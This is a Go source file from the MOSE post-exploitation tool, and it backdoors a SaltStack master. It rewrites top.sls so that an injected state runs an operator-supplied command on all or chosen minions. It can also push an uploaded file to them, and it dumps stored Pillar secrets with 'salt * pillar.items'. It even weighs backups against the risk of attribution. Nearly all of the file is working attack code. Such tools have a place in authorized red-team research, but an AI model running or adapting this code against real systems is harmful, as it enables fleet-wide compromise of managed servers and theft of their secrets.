// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.
package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"text/template"

	"github.com/ghodss/yaml"
	"github.com/gobuffalo/packr/v2"
	utils "github.com/l50/goutils"
	"github.com/master-of-servers/mose/pkg/moseutils"
)

type Command struct {
	Cmd       string
	FileName  string
	StateName string
}

type Metadata struct {
	PayloadName string
}

var (
	a                = CreateAgent()
	bdCmd            = a.Cmd
	debug            = a.Debug
	localIP          = a.LocalIP
	osTarget         = a.OsTarget
	saltState        = a.PayloadName
	uploadFileName   = a.FileName
	suppliedFilename string
	keys             []string
	inspect          bool
	uploadFilePath   = a.RemoteUploadFilePath
	cleanup          bool
	cleanupFile      = a.CleanupFile
	saltBackupLoc    = a.SaltBackupLoc
	specific         bool
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
	flag.BoolVar(&specific, "s", false, "Specify which environments of the top.sls you would like to backdoor")
}

func backdoorTop(topLoc string) {
	bytes, err := moseutils.ReadBytesFromFile(topLoc)
	if err != nil {
		moseutils.Info(fmt.Sprint(err))
		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
	}

	var unmarshalled map[string]interface{}
	err = yaml.Unmarshal(bytes, &unmarshalled)
	if err != nil {
		log.Fatal(err)
	}
	//I am going to prompt questions before hand because reiterating through this is a monster
	ans, err := moseutils.AskUserQuestion("Would you like to inject all layers?", a.OsTarget)
	if err != nil {
		log.Fatalf("Quitting...")
	}
	injectAll := ans

	ans, err = moseutils.AskUserQuestion("Would you like to add  all to layers if no '*' is found?", a.OsTarget)
	if err != nil {
		log.Fatalf("Quitting...")
	}
	addAllIfNone := ans

	// mapOfInjects will be a hashmap of hashmaps that point to what host and what fileroot we want to inject
	unmarshalled, mapOfInjects := injectYaml(unmarshalled, injectAll, addAllIfNone, nil)

	if injectAll || addAllIfNone {
		return
	}

	validBool, validIndex := validateIndicies(mapOfInjects)
	if ans, err := moseutils.IndexedUserQuestion("Provide index of steps you would like to inject in the site.yml (ex. 1,3,...)", a.OsTarget, validBool, func() { prettyPrint(validIndex) }); err == nil {
		// Need to take the responses and then inject
		for i, b := range ans {
			if b {
				for k, v := range mapOfInjects {
					for k1, _ := range v {
						if validIndex[i] == fmt.Sprintf("Fileroot: %v Hosts: %v", k, k1) {
							mapOfInjects[k][k1] = true
						}
					}
				}
			}
		}
	} else if err != nil {
		log.Fatalf("Quitting...")
	}

	unmarshalled, _ = injectYaml(unmarshalled, false, false, mapOfInjects)

	writeYamlToTop(unmarshalled, topLoc)
}

func prettyPrint(data map[int]string) {
	moseutils.Info("Specific injection method requested, displaying indicies to select")
	for i := 0; i < len(data); i++ {
		moseutils.Msg(fmt.Sprintf("[%d] %s", i, data[i]))
	}
}

func validateIndicies(data map[string]map[string]bool) (map[int]bool, map[int]string) {
	validIndex := make(map[int]string, 0)
	validIndexBool := make(map[int]bool, 0)
	moseutils.Info("Specific injection method requested, displaying indicies to select")
	for k, v := range data {
		ind := 0
		for k1, _ := range v {
			moseutils.Msg(fmt.Sprintf("[%d] Fileroot: %v Hosts: %v", ind, k, k1))
			validIndex[ind] = fmt.Sprintf("Fileroot: %v Hosts: %v", k, k1)
			validIndexBool[ind] = true
			ind += 1
		}
	}
	return validIndexBool, validIndex
}

func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNone bool, injectionMap map[string]map[string]bool) (map[string]interface{}, map[string]map[string]bool) {
	var injectPointsCreate map[string]map[string]bool
	if injectionMap == nil {
		injectPointsCreate = make(map[string]map[string]bool)
	}

	for k, v := range unmarshalled { //k is the fileroot if file_roots is not in the file
		if k == "file_roots" { // There are two general cases for the top.sls. You can have a root element file_roots (optional)
			for fileroot, frv := range v.(map[string]interface{}) { // unpack the fileroot such as base: interface{}
				isAllFound := false

				if injectionMap == nil {
					injectPointsCreate[fileroot] = make(map[string]bool)
				}
				for hosts, _ := range frv.(map[string]interface{}) { //now unpack the hosts it will run on: '*': interface{}
					if hosts == "'*'" { //check if all case exists
						isAllFound = true
					}
					if injectAll { //now if this is set we just inject irregardless of host
						unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts] = append(unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts].([]interface{}), saltState)
					}
					//Add hosts to the injection Points
					if injectionMap == nil {
						injectPointsCreate[fileroot][hosts] = true
					} else if injectionMap[fileroot][hosts] {
						unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts] = append(unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})[hosts].([]interface{}), saltState)
					}
				}
				if !isAllFound && addAllIfNone { //'*' is not found so we make our own and add new key to base, prod, dev, etc..
					unmarshalled["file_roots"].(map[string]interface{})[fileroot].(map[string]interface{})["*"] = []string{saltState}
				}
			}
		} else {
			isAllFound := false
			if injectionMap == nil {
				injectPointsCreate[k] = make(map[string]bool)
			}
			for hosts, _ := range v.(map[string]interface{}) {
				if hosts == "'*'" { //check if all case exists
					isAllFound = true
				}
				if injectAll { // append to list of states to apply
					unmarshalled[k].(map[string]interface{})[hosts] = append(unmarshalled[k].(map[string]interface{})[hosts].([]interface{}), saltState)
				}
				//Add hosts to the injection Points
				if injectionMap == nil {
					injectPointsCreate[k][hosts] = false
				} else if injectionMap[k][hosts] {
					unmarshalled[k].(map[string]interface{})[hosts] = append(unmarshalled[k].(map[string]interface{})[hosts].([]interface{}), saltState)
				}

			}
			if !isAllFound && addAllIfNone { //'*' is not found so we make our own and add new key to base, prod, dev, etc...
				unmarshalled[k].(map[string]interface{})["*"] = []string{saltState}
			}
		}
	}
	return unmarshalled, injectPointsCreate
}

func createState(topLoc string, cmd string) {
	topLocPath := filepath.Dir(topLoc) //Get directory leading to top.sls
	stateFolderLoc := filepath.Join(topLocPath, saltState)
	stateFolders := []string{stateFolderLoc}

	stateFilePath := filepath.Join(topLocPath, saltState, saltState+".sls")

	if moseutils.CreateFolders(stateFolders) && generateState(stateFilePath, cmd, saltState) {
		moseutils.Msg("Successfully created the %s state at %s", saltState, stateFilePath)
		moseutils.Msg("Adding folder %s to cleanup file", stateFolderLoc)
		// Track the folders for clean up purposes
		moseutils.TrackChanges(cleanupFile, stateFolderLoc)
		if uploadFileName != "" {
			saltFileFolders := filepath.Join(stateFolderLoc, "files")

			moseutils.CreateFolders([]string{saltFileFolders})
			moseutils.Info("Copying  %s to module location %s", uploadFileName, saltFileFolders)
			moseutils.CpFile(uploadFileName, filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
			if err := os.Chmod(filepath.Join(saltFileFolders, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal(err)
			}
			moseutils.Info("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
		}
	} else {
		log.Fatalf("Failed to create %s state", saltState)
	}
}

func generateState(stateFile string, cmd string, stateName string) bool {
	saltCommands := Command{
		Cmd:       bdCmd,
		FileName:  uploadFileName,
		StateName: stateName,
	}

	box := packr.New("Salt", "../../../templates/salt")

	s, err := box.FindString("saltState.tmpl")
	if uploadFileName != "" {
		s, err = box.FindString("saltFileUploadState.tmpl")
	}

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("saltState").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	f, err := os.Create(stateFile)

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, saltCommands)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()

	return true
}

func doCleanup(siteLoc string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
	if err != nil {
		log.Fatal("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}

	path = path + ".bak.mose"

	if !moseutils.FileExists(path) {
		moseutils.Info("Backup file %s does not exist, skipping", path)
	}
	ans2 := false
	if !ans {
		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
		if err != nil {
			log.Fatal("Quitting...")
		}
	}
	if ans || ans2 {
		moseutils.CpFile(path, siteLoc)
		os.Remove(path)
	}
	os.Exit(0)
}

func backupSite(siteLoc string) {
	path := siteLoc
	if saltBackupLoc != "" {
		path = filepath.Join(saltBackupLoc, filepath.Base(siteLoc))
	}
	if !moseutils.FileExists(path + ".bak.mose") {
		moseutils.CpFile(siteLoc, path+".bak.mose")
		return
	}
	moseutils.Info("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
	return
}

func writeYamlToTop(topSlsYaml map[string]interface{}, fileLoc string) {
	marshalled, err := yaml.Marshal(&topSlsYaml)
	if err != nil {
		log.Fatal(err)
	}

	err = moseutils.WriteBytesToFile(fileLoc, marshalled, 0644)
	if err != nil {
		log.Fatalf("error: %v", err)
	}
	moseutils.Info("%s successfully created", fileLoc)
}

func getPillarSecrets(binLoc string) {
	//Running command salt '*' pillar.items
	res, err := utils.RunCommand(binLoc, "*", "pillar.items")
	if err != nil {
		moseutils.Info("Error running command: %s '*' pillar.items", binLoc)
		log.Fatal(err)
	}
	moseutils.Msg("%s", res)

	return
}

func main() {
	// parse args
	flag.Parse()

	// gonna assume not root then we screwed
	utils.CheckRoot()

	if uploadFilePath != "" {
		moseutils.TrackChanges(cleanupFile, uploadFilePath)
	}

	found, binLoc := moseutils.FindFile("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
	if !found {
		log.Fatalf("salt binary not found, exiting...")
	}
	found, topLoc := moseutils.FindFile("top.sls", []string{"/srv/salt"})
	if !found {
		log.Fatalf("top.sls not found, exiting...")
	}

	if cleanup {
		doCleanup(topLoc)
	}
	if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", a.OsTarget); ans && err == nil {
		backupSite(topLoc)
	} else if err != nil {
		log.Fatalf("Error backing up %s: %v, exiting...", topLoc, err)
	}

	moseutils.Msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
	backdoorTop(topLoc)
	createState(topLoc, bdCmd)

	moseutils.Info("Attempting to find secrets stored with salt Pillars")
	getPillarSecrets(strings.TrimSpace(binLoc))
}
